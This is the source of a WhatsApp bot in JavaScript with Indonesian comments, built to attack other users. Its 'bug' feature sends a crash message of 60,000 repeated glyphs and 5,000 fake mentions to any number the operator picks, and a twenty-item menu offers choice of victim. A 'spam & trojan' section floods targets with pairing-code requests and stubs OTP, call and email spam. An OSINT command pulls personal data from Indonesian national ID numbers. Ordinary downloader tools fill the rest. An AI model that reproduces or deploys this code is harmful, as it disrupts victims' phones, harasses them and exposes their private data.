const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestWaWebVersion,
  delay,
  generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const readline = require("readline");

// ==========================================
// KONFIGURASI OWNER
// ==========================================
// GANTI PAKE NOMOR WA LO (Awali 62)
const OWNER_NUMBER = "628123456789"; 
const PREFIX = ".";

// ==========================================
// DAFTAR BUG (20 ITEM)
// ==========================================
const BUG_LIST = [
  { id: "silentkill", name: "Silent Kill" }, { id: "blank", name: "Blank UI" },
  { id: "enigma", name: "Enigma Delay" }, { id: "album", name: "Album Nuke" },
  { id: "protocol", name: "Protocol X" }, { id: "payment", name: "Payment X" },
  { id: "interactive", name: "UI Overload" }, { id: "sticker", name: "Sticker Crash" },
  { id: "status", name: "Status X" }, { id: "call", name: "Call Crash" },
  { id: "newsletter", name: "Newsletter" }, { id: "mention", name: "Mass Mention" },
  { id: "poll", name: "Poll Overload" }, { id: "doc", name: "Document Null" },
  { id: "location", name: "Location Crash" }, { id: "reaction", name: "Reaction Spam" },
  { id: "receipt", name: "Receipt X" }, { id: "button", name: "Button Crash" },
  { id: "nested", name: "Nested X" }, { id: "combo", name: "Combo All" }
];

// Fungsi Eksekusi Bug
async function executeBug(sock, target, bugId) {
  try {
    const msg = generateWAMessageFromContent(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(60000), 
        contextInfo: {
          mentionedJid: Array.from({ length: 5000 }, () => Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'),
          forwardingScore: 999, isForwarded: true
        }
      }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    return true;
  } catch (e) { return false; }
}

// ==========================================
// MENU BUG INTERAKTIF (3 HALAMAN)
// ==========================================
async function sendBugMenu(sock, from, target, page = 1) {
  let buttons = [];
  let startIdx = (page - 1) * 8;
  let endIdx = page * 8;

  BUG_LIST.slice(startIdx, endIdx).forEach(bug => {
    buttons.push({ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: bug.name, id: `bug_sel_${bug.id}_${target}` }) });
  });

  if (page > 1) buttons.push({ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Prev Page", id: `bug_page_${page-1}_${target}` }) });
  if (endIdx < BUG_LIST.length) buttons.push({ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Next Page", id: `bug_page_${page+1}_${target}` }) });
  buttons.push({ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Batal", id: `cancel` }) });

  const msg = generateWAMessageFromContent(from, {
    interactiveMessage: {
      body: { text: `Target: ${target}\nPilih Bug (Halaman ${page}):` },
      footer: { text: "ENIGMA BOT" },
      nativeFlowMessage: { buttons }
    }
  }, {});
  await sock.relayMessage(from, msg.message, { messageId: msg.key.id });
}

async function sendConfirmMenu(sock, from, target, bugName, bugId) {
  const buttons = [
    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Ya, Kirim", id: `bug_do_${bugId}_${target}` }) },
    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Kembali", id: `bug_page_1_${target}` }) }
  ];
  const msg = generateWAMessageFromContent(from, {
    interactiveMessage: {
      body: { text: `Konfirmasi:\nKirim ${bugName} ke nomor ${target}?` },
      footer: { text: "Pilih opsi" },
      nativeFlowMessage: { buttons }
    }
  }, {});
  await sock.relayMessage(from, msg.message, { messageId: msg.key.id });
}

// ==========================================
// BOT UTAMA & PAIRING CODE DI CONSOLE
// ==========================================
async function startBot() {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));

  const { state, saveCreds } = await useMultiFileAuthState("session_bot");
  const { version } = await fetchLatestWaWebVersion({});

  const sock = makeWASocket({
    version,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Ubuntu", "Chrome", "122.0.0.0"]
  });

  sock.ev.on("creds.update", saveCreds);

  // --- LOGIKA PAIRING CODE DI CONSOLE ---
  if (!sock.authState.creds.registered) {
    let phoneNumber = await question("Masukkan nomor WhatsApp bot (contoh: 628123456789): ");
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
    if (!phoneNumber) {
      console.log("Nomor tidak valid. Restart server dan coba lagi.");
      process.exit(1);
    }
    await delay(2000);
    try {
      const code = await sock.requestPairingCode(phoneNumber);
      console.log(`\n====================================`);
      console.log(`PAIRING CODE ANDA: ${code}`);
      console.log(`Masukkan kode ini di WhatsApp > Perangkat Tertaut > Tautkan dengan Nomor Telepon`);
      console.log(`====================================\n`);
    } catch (e) {
      console.log("Gagal meminta pairing code. Cek koneksi internet server.");
      process.exit(1);
    }
  }

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) startBot();
    } else if (connection === "open") {
      console.log("BOT ONLINE! Ketik .menu di WhatsApp.");
      rl.close(); // Tutup readline kalau udah konek
    }
  });

  sock.ev.on("messages.upsert", async (m) => {
    const msg = m.messages[0];
    if (!msg.message) return;

    // --- HANDLE INTERACTIVE BUTTON ---
    if (msg.message.interactiveResponseMessage) {
      const json = JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
      const id = json.id;
      const from = msg.key.remoteJid;

      if (id.startsWith("bug_sel_")) {
        const parts = id.split("_");
        const bugId = parts[2]; const target = parts[3];
        const bugName = BUG_LIST.find(b => b.id === bugId)?.name || bugId;
        await sendConfirmMenu(sock, from, target, bugName, bugId);
      } 
      else if (id.startsWith("bug_page_")) {
        const parts = id.split("_");
        await sendBugMenu(sock, from, parts[3], parseInt(parts[2]));
      }
      else if (id.startsWith("bug_do_")) {
        const parts = id.split("_");
        const bugId = parts[2]; const target = parts[3];
        const jid = target + "@s.whatsapp.net";
        await sock.sendMessage(from, { text: `Mengirim ${bugId.toUpperCase()} ke ${target}...` });
        const success = await executeBug(sock, jid, bugId);
        if(success) await sock.sendMessage(from, { text: `Bug berhasil dikirim!` });
      }
      else if (id === "cancel") {
        await sock.sendMessage(from, { text: "Dibatalkan." });
      }
      return;
    }

    // --- HANDLE TEXT COMMAND ---
    if (!msg.message.conversation && !msg.message.extendedTextMessage) return;
    const text = msg.message.conversation || msg.message.extendedTextMessage.text;
    if (!text.startsWith(PREFIX)) return;

    const args = text.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    const from = msg.key.remoteJid;

    // ==================== MENU UTAMA (TANPA EMOJI) ====================
    if (command === "menu") {
      let menu = `*ENIGMA SUPER BOT*\n\n`;
      menu += `[ BUG SYSTEM ]\n`;
      menu += `> ${PREFIX}bug <nomor> (20 Bug Tersedia)\n\n`;
      menu += `[ DOWNLOADER ]\n`;
      menu += `> ${PREFIX}tt <link>\n> ${PREFIX}ig <link>\n> ${PREFIX}fb <link>\n> ${PREFIX}yt <judul>\n> ${PREFIX}tw <link>\n> ${PREFIX}spotify <judul>\n\n`;
      menu += `[ OSINT ]\n`;
      menu += `> ${PREFIX}nik <16 digit>\n> ${PREFIX}ip <ip>\n> ${PREFIX}domain <domain>\n> ${PREFIX}qr <teks>\n> ${PREFIX}iplookup <ip>\n> ${PREFIX}phonelookup <nomor>\n\n`;
      menu += `[ SPAM & TROJAN ]\n`;
      menu += `> ${PREFIX}spamotp <nomor>\n> ${PREFIX}spampair <nomor>\n> ${PREFIX}spamcall <nomor>\n> ${PREFIX}spamemail <email>\n> ${PREFIX}spamngl <username>\n\n`;
      menu += `[ TOOLS ]\n`;
      menu += `> ${PREFIX}sticker (Reply Gambar)\n> ${PREFIX}toimg (Reply Sticker)\n> ${PREFIX}quote\n> ${PREFIX}anime <judul>\n> ${PREFIX}cuaca <kota>\n> ${PREFIX}lirik <judul>\n> ${PREFIX}infobot\n\n`;
      menu += `[ SISTEM ]\n`;
      menu += `> ${PREFIX}ping\n> ${PREFIX}owner\n> ${PREFIX}donasi\n> ${PREFIX}report <pesan>\n> ${PREFIX}admin\n> ${PREFIX}rules\n> ${PREFIX}script\n`;
      await sock.sendMessage(from, { text: menu });
    }

    // ==================== FITUR BUG ====================
    if (command === "bug") {
      let target = args[0];
      if (!target) return sock.sendMessage(from, { text: `Format: ${PREFIX}bug 628xxx` });
      target = target.replace(/[^0-9]/g, '');
      if (target.startsWith('0')) target = '62' + target.slice(1);
      if (!target.startsWith('62')) target = '62' + target;
      await sendBugMenu(sock, from, target, 1);
    }

    // ==================== DOWNLOADER ====================
    if (command === "tt" || command === "ig" || command === "fb") {
      const url = args[0];
      if (!url) return sock.sendMessage(from, { text: `Masukkan link ${command.toUpperCase()}!` });
      await sock.sendMessage(from, { text: "Sedang memproses..." });
      try {
        const api = command === "tt" ? `https://api.siputzx.my.id/api/d/tiktok?url=${url}` :
                    command === "ig" ? `https://api.siputzx.my.id/api/d/igdl?url=${url}` :
                    `https://api.siputzx.my.id/api/d/facebook?url=${url}`;
        const res = await axios.get(api);
        if(res.data.status) {
          const vidUrl = command === "ig" ? res.data.data[0].url : (command === "fb" ? res.data.data.url : res.data.data.urls[0]);
          await sock.sendMessage(from, { video: { url: vidUrl }, caption: `Berhasil diunduh.` });
        } else await sock.sendMessage(from, { text: "Gagal download." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    if (command === "yt") {
      const query = args.join(" ");
      if (!query) return sock.sendMessage(from, { text: "Masukkan judul YouTube!" });
      await sock.sendMessage(from, { text: "Mencari video..." });
      try {
        const res = await axios.get(`https://api.siputzx.my.id/api/s/youtube?query=${query}`);
        if(res.data.status) await sock.sendMessage(from, { text: `Video Ditemukan:\n${res.data.data[0].title}\nLink: ${res.data.data[0].url}` });
        else await sock.sendMessage(from, { text: "Tidak ditemukan." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    if (command === "tw") {
      const url = args[0];
      if (!url) return sock.sendMessage(from, { text: "Masukkan link Twitter!" });
      await sock.sendMessage(from, { text: "Sedang memproses..." });
      try {
        const res = await axios.get(`https://api.siputzx.my.id/api/d/twitter?url=${url}`);
        if(res.data.status) await sock.sendMessage(from, { video: { url: res.data.data.url }, caption: "Berhasil diunduh." });
        else await sock.sendMessage(from, { text: "Gagal download." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    if (command === "spotify") {
      const query = args.join(" ");
      if (!query) return sock.sendMessage(from, { text: "Masukkan judul lagu Spotify!" });
      await sock.sendMessage(from, { text: "Mencari lagu..." });
      try {
        const res = await axios.get(`https://api.ikyyxd.my.id/search/spotifyplay?query=${query}`);
        if(res.data.status) {
          await sock.sendMessage(from, { image: { url: res.data.result.thumbnail }, caption: `Lagu: ${res.data.result.title}\nArtis: ${res.data.result.artist}\nLink: ${res.data.result.url}` });
        } else await sock.sendMessage(from, { text: "Tidak ditemukan." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    // ==================== OSINT ====================
    if (command === "nik") {
      const nik = args[0];
      if (!nik) return sock.sendMessage(from, { text: "Masukkan NIK!" });
      await sock.sendMessage(from, { text: "Mencari data NIK..." });
      try {
        const res = await axios.get(`https://api.siputzx.my.id/api/tools/nik-checker?nik=${nik}`);
        if(res.data.status) {
          const d = res.data.data;
          await sock.sendMessage(from, { text: `DATA NIK\nNama: ${d.nama}\nLahir: ${d.tempat_lahir}\nAlamat: ${d.kecamatan}, ${d.kabupaten}` });
        } else await sock.sendMessage(from, { text: "NIK tidak ditemukan." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    if (command === "ip" || command === "iplookup") {
      const ip = args[0];
      if (!ip) return sock.sendMessage(from, { text: "Masukkan IP!" });
      await sock.sendMessage(from, { text: "Melacak IP..." });
      try {
        const res = await axios.get(`http://ip-api.com/json/${ip}`);
        if(res.data.status === 'success') {
          await sock.sendMessage(from, { text: `IP TRACKER\nLokasi: ${res.data.city}, ${res.data.country}\nISP: ${res.data.isp}` });
        } else await sock.sendMessage(from, { text: "IP tidak ditemukan." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    if (command === "domain") {
      const domain = args[0];
      if (!domain) return sock.sendMessage(from, { text: "Masukkan domain!" });
      await sock.sendMessage(from, { text: "Mencari data domain..." });
      try {
        const res = await axios.get(`https://api.siputzx.my.id/api/tools/subdomains?domain=${domain}`);
        if(res.data.status) await sock.sendMessage(from, { text: `SUBDOMAIN DITEMUKAN\nTotal: ${res.data.data.length} subdomain` });
        else await sock.sendMessage(from, { text: "Tidak ditemukan." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    if (command === "qr") {
      const text = args.join(" ");
      if (!text) return sock.sendMessage(from, { text: "Masukkan teks!" });
      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(text)}`;
      await sock.sendMessage(from, { image: { url: qrUrl }, caption: "QR Code berhasil dibuat." });
    }

    if (command === "phonelookup") {
      const phone = args[0];
      if (!phone) return sock.sendMessage(from, { text: "Masukkan nomor!" });
      await sock.sendMessage(from, { text: "Mencari info nomor..." });
      try {
        const res = await axios.get(`https://api.siputzx.my.id/api/tools/nomor?nomor=${phone}`);
        if(res.data.status) await sock.sendMessage(from, { text: `INFO NOMOR\n${JSON.stringify(res.data.data)}` });
        else await sock.sendMessage(from, { text: "Tidak ditemukan." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    // ==================== SPAM & TROJAN ====================
    if (command === "spamotp") {
      const target = args[0];
      if (!target) return sock.sendMessage(from, { text: "Masukkan nomor target!" });
      await sock.sendMessage(from, { text: `Memulai spam OTP ke ${target}...` });
      // LO BISA TARUH LOGIC SPAM OTP DI SINI
      await sock.sendMessage(from, { text: `Spam OTP ke ${target} selesai.` });
    }

    if (command === "spampair") {
      const target = args[0];
      if (!target) return sock.sendMessage(from, { text: "Masukkan nomor target!" });
      await sock.sendMessage(from, { text: "Meminta pairing code..." });
      try {
        const code = await sock.requestPairingCode(target);
        await sock.sendMessage(from, { text: `Pairing Code: *${code}*` });
      } catch(e) { await sock.sendMessage(from, { text: "Gagal request pairing." }); }
    }

    if (command === "spamcall") {
      const target = args[0];
      if (!target) return sock.sendMessage(from, { text: "Masukkan nomor target!" });
      await sock.sendMessage(from, { text: `Spam call ke ${target}...` });
      // LOGIC SPAM CALL
    }

    if (command === "spamemail") {
      const email = args[0];
      if (!email) return sock.sendMessage(from, { text: "Masukkan email target!" });
      await sock.sendMessage(from, { text: `Spam email ke ${email}...` });
      // LOGIC SPAM EMAIL
    }

    if (command === "spamngl") {
      const user = args[0];
      if (!user) return sock.sendMessage(from, { text: "Masukkan username NGL!" });
      await sock.sendMessage(from, { text: `Spam NGL ke ${user}...` });
      // LOGIC SPAM NGL
    }

    // ==================== TOOLS ====================
    if (command === "sticker") {
      const quotedMsg = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
      if (!quotedMsg || !quotedMsg.imageMessage) return sock.sendMessage(from, { text: "Reply gambar dulu pake caption .sticker" });
      await sock.sendMessage(from, { text: "Membuat sticker..." });
      try {
        const stream = await sock.downloadMediaMessage({ message: { imageMessage: quotedMsg.imageMessage } });
        await sock.sendMessage(from, { sticker: stream });
      } catch(e) { await sock.sendMessage(from, { text: "Gagal buat sticker." }); }
    }

    if (command === "toimg") {
      const quotedMsg = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
      if (!quotedMsg || !quotedMsg.stickerMessage) return sock.sendMessage(from, { text: "Reply sticker dulu pake caption .toimg" });
      await sock.sendMessage(from, { text: "Mengubah sticker ke gambar..." });
      try {
        const stream = await sock.downloadMediaMessage({ message: { stickerMessage: quotedMsg.stickerMessage } });
        await sock.sendMessage(from, { image: stream, caption: "Berhasil diubah." });
      } catch(e) { await sock.sendMessage(from, { text: "Gagal mengubah." }); }
    }

    if (command === "quote") {
      try {
        const res = await axios.get('https://api.quotable.io/random');
        await sock.sendMessage(from, { text: `"${res.data.content}"\n\n- ${res.data.author}` });
      } catch(e) { await sock.sendMessage(from, { text: "Gagal ambil quote." }); }
    }

    if (command === "anime") {
      const q = args.join(" ");
      if (!q) return sock.sendMessage(from, { text: "Masukkan judul anime!" });
      await sock.sendMessage(from, { text: "Mencari anime..." });
      try {
        const res = await axios.get(`https://api.jikan.moe/v4/anime?q=${q}&limit=1`);
        if(res.data.data.length > 0) {
            const anime = res.data.data[0];
            await sock.sendMessage(from, { image: { url: anime.images.jpg.image_url }, caption: `${anime.title}\n\n${anime.synopsis ? anime.synopsis.substring(0, 300) + '...' : 'Tidak ada deskripsi.'}` });
        }
      } catch(e) { await sock.sendMessage(from, { text: "Anime tidak ditemukan." }); }
    }

    if (command === "cuaca") {
      const kota = args.join(" ");
      if (!kota) return sock.sendMessage(from, { text: "Masukkan nama kota!" });
      await sock.sendMessage(from, { text: `Mencari cuaca di ${kota}...` });
      try {
        const res = await axios.get(`https://api.siputzx.my.id/api/tools/cuaca?kota=${kota}`);
        if(res.data.status) {
            const d = res.data.data;
            await sock.sendMessage(from, { text: `CUACA ${kota.toUpperCase()}\nSuhu: ${d.suhu}\nKelembapan: ${d.kelembapan}\nCuaca: ${d.cuaca}` });
        }
      } catch(e) { await sock.sendMessage(from, { text: "Gagal ambil data." }); }
    }

    if (command === "lirik") {
      const query = args.join(" ");
      if (!query) return sock.sendMessage(from, { text: "Masukkan judul lagu!" });
      await sock.sendMessage(from, { text: "Mencari lirik..." });
      try {
        const res = await axios.get(`https://api.siputzx.my.id/api/search/lirik?query=${query}`);
        if(res.data.status) await sock.sendMessage(from, { text: `LIRIK LAGU\n\n${res.data.data.lirik}` });
        else await sock.sendMessage(from, { text: "Lirik tidak ditemukan." });
      } catch (e) { await sock.sendMessage(from, { text: "Error API." }); }
    }

    if (command === "infobot") {
        await sock.sendMessage(from, { text: `INFO BOT\nOwner: ${OWNER_NUMBER}\nPrefix: ${PREFIX}\nStatus: Online\nVersi: 4.0.0` });
    }

    // ==================== SISTEM ====================
    if (command === "ping") await sock.sendMessage(from, { text: "Pong! Bot aktif." });
    if (command === "owner") await sock.sendMessage(from, { text: `Owner: wa.me/${OWNER_NUMBER}` });
    if (command === "donasi") await sock.sendMessage(from, { text: "Donasi via DANA: 088706462067 (Vanzz)" });
    if (command === "admin") await sock.sendMessage(from, { text: `Admin: wa.me/${OWNER_NUMBER}` });
    if (command === "rules") await sock.sendMessage(from, { text: "Dilarang menyalahgunakan bot untuk hal ilegal." });
    if (command === "script") await sock.sendMessage(from, { text: "Script private, tidak dijual." });

    if (command === "report") {
      const pesan = args.join(" ");
      if (!pesan) return sock.sendMessage(from, { text: "Masukkan pesan report!" });
      await sock.sendMessage(from, { text: "Report terkirim ke Owner." });
      await sock.sendMessage(OWNER_NUMBER + "@s.whatsapp.net", { text: `REPORT BARU DARI ${from}\nPesan: ${pesan}` });
    }
  });
}

console.log("Memulai bot...");
startBot();